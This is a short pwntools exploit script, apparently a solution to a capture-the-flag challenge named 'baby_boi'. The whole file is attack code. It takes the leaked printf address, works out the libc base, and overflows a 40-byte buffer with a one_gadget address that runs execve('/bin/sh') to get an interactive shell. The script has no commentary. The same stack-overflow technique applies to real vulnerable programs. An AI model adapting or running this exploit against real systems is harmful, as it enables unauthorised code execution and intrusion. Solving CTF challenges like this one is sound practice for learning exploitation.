from pwn import * 


context(terminal=['tmux','new-window'])
p = process("./baby_boi")
#p= gdb.debug("./baby_boi","b *main")
libc = ELF('libc-2.27.so')

p.recvuntil("Here I am: ")
printf_leak_addr = int(p.recvline()[:-1],16)

base = printf_leak_addr - libc.symbols['printf']
print "base: " + hex(base)
one_gadget = base + 0x4f322 # one_gadget libc-2.27.so ->  0x4f322 execve("/bin/sh", rsp+0x40, environ) 


payload = ''
payload += '0' * 40
payload += p64(one_gadget) 


p.sendline(payload)
p.interactive()


